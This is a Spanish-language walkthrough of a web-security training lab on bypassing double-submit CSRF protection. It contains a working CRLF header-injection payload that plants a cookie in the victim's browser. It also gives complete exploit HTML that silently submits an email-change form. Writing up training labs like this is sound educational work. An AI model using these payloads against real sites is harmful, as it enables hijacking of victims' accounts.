...
Si nos fijamos en la `petición` de `cambiar email`, vemos que se están transmitiendo dos tokens CSRF, uno en el body y otro como cookie. A esto se le conoce como `double submit` y es una técnica de prevención contra ataques CSRF

![](/assets/img/CSRF-Lab-6/image_4.png)

Si modificamos cualquiera de los dos token nos saldrá un mensaje que diga `Invalid CSRF token`
...
Sin embargo, si `modificamos` la `cookie csrf` no nos `desloguea`, pero `cambia` el `valor` del `token CSRF` y el de la `cookie csrf`. Esto nos confirma que la `cookie csrf` y el `token CSRF` son lo mismo
...
```
/?search=test
\r\nSet-Cookie: csrfKey= YTsWg78CxTrlzpWjDmAnquz4IaS4Zasa5; SameSite= None
```

```
/?search=test%0D%0ASet-Cookie:%20csrfKey=%20YTsWg78CxTrlzpWjDmAnquz4IaS4Zasa5%3b%20SameSite=%20None
```

![](/assets/img/CSRF-Lab-6/image_14.png)

En mi caso he usado `Visual Studio Code` para `construir` este `payload`. El `valor` del `token CSRF` y el de la `cookie csrfKey` son nuestros, `los cuales obtenemos tras loguearnos`. Lo primero que hace este `exploit` es `rellenar el formulario de cambio de email` y `posteriormente mediante una imagen hacemos una petición que le setea al usuario víctima nuestra csrfKey` y `el atributo Samesite=None`, por último, `como esto no es ninguna imagen va a dar un error y va a enviar el formulario`

```
<html>
    <body>
        <form action="https://0ac3001604854aeb80e1a31e00da0035.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@gmail.com">
            <input type="hidden" name="csrf" value="YTsWg78CxTrlzpWjDmAnquz4IaS4Zasa">
        </form>
        <img src="https://0ac3001604854aeb80e1a31e00da0035.web-security-academy.net/?search=test%0D%0ASet-Cookie:%20csrfKey=%20YTsWg78CxTrlzpWjDmAnquz4IaS4Zasa%3b%20SameSite=%20None" onerror="document.forms[0].submit();">
    </body>    
</html>
```
...
![](/assets/img/CSRF-Lab-6/image_15.png)
...
![](/assets/img/CSRF-Lab-6/image_16.png)

Para `comprobar` que `funciona` nos dirigimos a nuestro `Exploit server` y pegamos el `payload`. En este caso, como ya estamos introduciendo el `payload` en el `body` en nuestro `Exploit server`, las etiquetas `html` y `body` no son necesarias
...
![](/assets/img/CSRF-Lab-6/image_17.png)

Una vez hecho esto pulsamos sobre `View exploit` para ver si nos `cambia` el `email` a nosotros y `efectivamente` nos lo `cambia`. Independientemente de como generemos el payload, para `completar` el `laboratorio` debemos pegarlo en el `Exploit server` y pulsar sobre `Delivery exploit to victim`. Debemos tener en cuenta que `dos usuarios no pueden tener el mismo email`, por lo tanto, `debemos cambiar nuestro email o cambiar el email del payload que enviamos`

![](/assets/img/CSRF-Lab-6/image_18.png)
